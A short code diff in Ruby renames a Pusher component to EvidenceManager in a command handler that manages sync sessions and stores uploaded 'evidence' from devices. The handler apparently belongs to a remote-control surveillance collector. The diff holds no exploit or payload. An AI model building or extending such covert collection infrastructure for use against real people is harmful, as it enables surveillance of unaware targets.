@@ -5,7 +5,7 @@
 # relatives
 require_relative 'db.rb'
 require_relative 'sessions.rb'
-require_relative 'pusher.rb'
+require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -57,7 +57,7 @@ module Commands
     now = Time.now - Time.now.utc_offset
 
     # notify the pusher that the sync is in progress    
-    Pusher.instance.sync_for session, version, user_id, device_id, source_id, now
+    EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
 
     # response to the request
     command = [PROTO_OK].pack('i')
@@ -101,7 +101,7 @@ module Commands
   def command_bye(peer, session, message)
 
     # notify the pusher that the sync has ended
-    Pusher.instance.sync_end session
+    EvidenceManager.instance.sync_end session
 
     # destroy the current session
     SessionManager.instance.delete(session[:cookie])
@@ -233,7 +233,7 @@ module Commands
 
     # send the evidence to the db
     begin
-      Pusher.instance.evidence size, message
+      EvidenceManager.instance.store session, size, message
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
